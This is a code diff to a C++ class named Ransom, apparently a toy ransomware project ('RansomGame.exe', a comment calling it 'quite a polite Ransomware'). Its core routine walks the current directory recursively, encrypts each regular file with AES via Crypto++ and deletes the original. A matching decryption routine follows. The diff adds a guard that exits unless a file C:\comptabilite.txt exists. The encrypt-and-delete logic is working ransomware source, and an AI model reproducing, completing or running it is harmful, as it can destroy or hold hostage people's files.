@@ -1,55 +1,67 @@
 #include "Ransom.h"
 
+#include "../cryptopp/files.h"
+
 inline bool EndOfFile(const CryptoPP::FileSource& file)
 {
 	std::istream* stream = const_cast<CryptoPP::FileSource&>(file).GetStream();
 	return stream->eof();
 }
 
-void Ransom::run_encryption_logic()
+void Ransom::run_encryption_logic(const char* exe_file_name)
 {
-	/*
-	 * 1- Get an encryption key
-	 * 2- Get all files
-	 * 3- Encrypt files
-	 */
+	// 1- Get an encryption key
+	// 2- Get all files
+	// 3- Encrypt files
+
+	safe_to_run();
 
 	this->generate_aes_key();
 	const auto path = std::filesystem::current_path();
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == "RansomGame.exe" || entry.path().filename().extension() == custom_extension_name)
+		if (entry.path().filename() == exe_file_name || entry.path().filename().extension() == custom_extension_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
+			continue;
 		}
-		else if (entry.is_regular_file())
+
+		if (entry.is_regular_file())
 		{
 			auto entry_name = absolute(entry).generic_string();
 			
+#ifdef DEBUG
 			std::cout << "Encrypting file " << entry_name << std::endl;
+#endif
+
 			encrypt_files(const_cast<char*>(entry_name.c_str()));
 			delete_file(const_cast<char*>(entry_name.c_str()));
 		}
 	}
 }
 
-void Ransom::run_decryption_logic()
+void Ransom::run_decryption_logic(const char* exe_file_name)
 {
 	// if isEncrypted, find all files with the proper custom extension
 	const auto path = std::filesystem::current_path();
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == "RansomGame.exe")
+		if (entry.path().filename() == exe_file_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
+			continue;			
 		}
-		else if (entry.is_regular_file() && entry.path().filename().extension() == custom_extension_name)
+		
+		if (entry.is_regular_file() && entry.path().filename().extension() == custom_extension_name)
 		{
 			auto entry_name = absolute(entry).generic_string();
 
+#ifdef DEBUG
 			std::cout << "Decrypting file " << entry_name << std::endl;
+#endif
+			
 			decrypt_files(const_cast<char*>(entry_name.c_str()));
 			delete_file(const_cast<char*>(entry_name.c_str()));
 		}
@@ -88,8 +100,9 @@ void Ransom::encrypt_files(const char* file_name)
 
 			processed += BLOCK_SIZE;
 
-			if (processed % (1024 * 1024 * 10) == 0)
+			if (processed % (1024 * 1024 * 10) == 0) {
 				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
+			}
 		}
 
 		// Signal there is no more data to process.
@@ -139,8 +152,10 @@ void Ransom::decrypt_files(const char* file_name)
 
 			processed += BLOCK_SIZE;
 
-			if (processed % (1024 * 1024 * 10) == 0)
+			if (processed % (1024 * 1024 * 10) == 0) {
 				std::cout << "Processed: " << meter.GetTotalBytes() << std::endl;
+			}		
+				
 		}
 
 		// Signal there is no more data to process.
@@ -175,5 +190,13 @@ void Ransom::delete_file(const char* file)
 	} else
 	{
 		std::cout << "File successfully deleted" << std::endl;
+	}
+}
+
+void safe_to_run()
+{
+	// That is quite a polite Ransomware
+	if(!std::filesystem::exists("C:\\comptabilite.txt")) {
+		exit(1);
 	}
 }
